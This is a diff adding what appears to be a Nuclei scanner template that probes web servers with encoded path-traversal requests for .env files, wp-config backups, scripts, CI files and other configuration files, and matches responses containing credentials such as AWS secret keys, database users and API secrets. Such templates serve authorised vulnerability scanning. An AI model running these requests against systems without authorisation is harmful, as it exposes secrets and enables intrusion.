@@ -1,0 +1,87 @@
+id: information-disclosure-erickfernandox
+
+info:
+  name: Information Disclosure
+  author: erickfernandox
+  severity: high
+  tags: cve,disclosure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}%2f%2e%2e%2f.env"
+      - "{{BaseURL}}%2f%2e%2e%2f.env.bkp"
+      - "{{BaseURL}}%2f%2e%2e%2fwp-config.old"      
+      - "{{BaseURL}}%2f%2e%2e%2fwp-config.php.old"            
+      - "{{BaseURL}}%2f%2e%2e%2fwp-config.txt"                  
+      - "{{BaseURL}}%2f%2e%2e%2fWEB-INF/classes/argo.properties"
+      - "{{BaseURL}}%2f%2e%2e%2f.env.old"
+      - "{{BaseURL}}%2f%2e%2e%2f.env.test"
+      - "{{BaseURL}}%2f%2e%2e%2fmetrics"
+      - "{{BaseURL}}%2f%2e%2e%2f.env.org"      
+      - "{{BaseURL}}%2f%2e%2e%2f_env"      
+      - "{{BaseURL}}%2f%2e%2e%2fconfig"            
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.yaml"
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.xml"
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.json"
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.js"
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.log"
+      - "{{BaseURL}}%2f%2e%2e%2fstart.sh"           
+      - "{{BaseURL}}%2f%2e%2e%2ftest.sh"               
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.sh"               
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.bat"            
+      - "{{BaseURL}}%2f%2e%2e%2fenv.sh"           
+      - "{{BaseURL}}%2f%2e%2e%2fwp-config.php_orig"
+      - "{{BaseURL}}%2f%2e%2e%2fbackup.sh"                             
+      - "{{BaseURL}}%2f%2e%2e%2fbackup.bat"                             
+      - "{{BaseURL}}%2f%2e%2e%2fconfigure.sh"                    
+      - "{{BaseURL}}%2f%2e%2e%2fapi.sh"        
+      - "{{BaseURL}}%2f%2e%2e%2fintegration.sh"             
+      - "{{BaseURL}}%2f%2e%2e%2fconection.sh"    
+      - "{{BaseURL}}%2f%2e%2e%2fconect.sh"
+      - "{{BaseURL}}%2f%2e%2e%2flog/backup.log"
+      - "{{BaseURL}}%2f%2e%2e%2f.gitlab-ci.yml"
+      - "{{BaseURL}}%2f%2e%2e%2flocal_settings.py"
+      - "{{BaseURL}}%2f%2e%2e%2fsettings.py"
+      - "{{BaseURL}}%2f%2e%2e%2fconfig.py"
+      - "{{BaseURL}}%2f%2e%2e%2fsettings"      
+      - "{{BaseURL}}%2f%2e%2e%2fapi/.env"
+      - "{{BaseURL}}%2f%2e%2e%2fenv-config.js"      
+      - "{{BaseURL}}%2f%2e%2e%2fapp/etc/local.xml"
+      - "{{BaseURL}}%2f%2e%2e%2f.github/workflows/puch.yml"
+      - "{{BaseURL}}%2f%2e%2e%2fauth.json"
+      - "{{BaseURL}}%2f%2e%2e%2fconfig/config.prod.json"
+      - "{{BaseURL}}%2f%2e%2e%2fenv/.config"      
+      
+    stop-at-first-match: true               
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "DB_USERNAME"
+          - "DB_USER"
+          - "AWS_SECRET_ACCESS_KEY"
+          - "aws_secret_access_key"
+          - "AWS_SECRET"    
+          - "SECRETKEY="              
+          - "SECRET_KEY="    
+          - "MYSQL_PASSWORD:"          
+          - "MAIL_PASSWORD:"          
+          - "SecretAccessKey"          
+          - "@echo off"          
+          - "#!/bin/bash"          
+          - "api_key="
+          - "api_secret="          
+          - "argo.database.user"
+          - "github-oauth:"          
+          - "'PASSWORD':"       
+          - "REACT_APP_ENV:"
+          
+        part: body
+
+      - type: status
+        status:
+          - 200
+          - 400
+          - 404
+          - 500
